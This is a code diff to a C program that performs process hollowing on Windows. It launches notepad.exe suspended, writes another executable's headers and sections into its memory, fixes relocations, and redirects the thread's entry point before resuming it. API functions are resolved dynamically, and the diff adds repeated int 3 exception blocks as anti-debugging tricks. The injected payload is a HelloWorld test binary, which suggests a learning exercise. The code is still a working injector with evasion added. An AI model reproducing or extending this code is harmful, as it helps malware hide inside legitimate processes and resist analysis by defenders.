@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <subauth.h>
 #include "Hollow.h"
+#include "Exception.h"
 
 #define DEBUG
 
@@ -197,6 +198,9 @@ inline int wmain()
 	PROCESS_INFORMATION blah1; 
 	ZeroMemory(&blah, sizeof(blah));
 	_CreateProcessA _CreateProc = find_function_address(kernel32_base, StrCreateProcessA);
+	__try {
+		__asm int 3;
+	}__except(EXCEPTION_EXECUTE_HANDLER){}
 	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
 		printf("error creating this trash process bye , %d!\n",GetLastError());
 		exit(1); 
@@ -212,6 +216,10 @@ inline int wmain()
 	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8; 
 	LPVOID TargetImageBase = 0;
 	SIZE_T bytesRead = NULL;
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, StrReadProcessMemory); 
 	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
 #ifdef DEBUG
@@ -226,7 +234,10 @@ inline int wmain()
 	
 	/*source file*/
 	_CreateFileA Createfil = find_function_address(kernel32_base,StrCreateFileA);
-	
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\ml\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
 	if (src==INVALID_HANDLE_VALUE) {
 #ifdef DEBUG
@@ -257,6 +268,10 @@ inline int wmain()
 
 	/*copy to target*/
 		/*Allocate memory*/
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
 	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
 	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
@@ -296,13 +311,20 @@ inline int wmain()
 #endif
 	srcNtHeaders->OptionalHeader.ImageBase = TargetImageBase;
 	/*copying headers*/
-	
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,StrWriteProcessMemory);
 	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
  
 	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
 
 	/*copying sections*/
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	BYTE Section; 
 	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
 	{
@@ -351,6 +373,10 @@ inline int wmain()
 				offset_block += sizeof(BASE_RELOCATION_ENTRY);
 				if (First_Block[X].Type)
 				{
+					__try {
+						__asm int 3;
+					}
+					__except (EXCEPTION_EXECUTE_HANDLER) {}
 					DWORD value;
 					ReadProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL);
 					value += Diff;
@@ -360,7 +386,11 @@ inline int wmain()
 					fflush(stdout); 
 					Sleep(2);
 					
-#endif
+#endif				
+					__try {
+						__asm int 3;
+					}
+					__except (EXCEPTION_EXECUTE_HANDLER) {}
 					if (!WriteProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL))
 					{
 						printf("[-] error error error");
@@ -374,8 +404,16 @@ inline int wmain()
 		
 		CONTEXT ctx ;
 		ctx.ContextFlags = CONTEXT_INTEGER;
+		__try {
+			__asm int 3;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {}
 		_GetThreadContext GetThreadCont = find_function_address(kernel32_base, StrGetThreadContext); 
 		_SetThreadContext SetThreadCont = find_function_address(kernel32_base, StrSetThreadContext);
+		__try {
+			__asm int 3;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {}
 		_ResumeThread ResumeThrea = find_function_address(kernel32_base, StrResumeThread); 
 		GetThreadCont(blah1.hThread, &ctx);
 		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
@@ -383,5 +421,9 @@ inline int wmain()
 		printf("\nEntry point Eax = 0x%x",ctx.Eax); 
 #endif
 		SetThreadCont(blah1.hThread,&ctx);
+		__try {
+			__asm int 3;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {}
 		ResumeThrea(blah1.hThread);
 }
